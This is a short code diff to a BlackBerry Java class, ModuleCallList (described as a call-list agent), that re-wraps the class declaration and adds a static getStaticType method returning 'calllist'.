@@ -25,12 +25,16 @@ import blackberry.utils.Utils;
 /**
  * The Class CallListAgent.
  */
-public final class ModuleCallList extends BaseModule implements CallListObserver {
+public final class ModuleCallList extends BaseModule implements
+        CallListObserver {
     //#ifdef DEBUG
     private static Debug debug = new Debug("CallListAgent", DebugLevel.VERBOSE);
+
     //#endif
 
-   
+    public static String getStaticType() {
+        return "calllist";
+    }
 
 
     public void actualStart() {
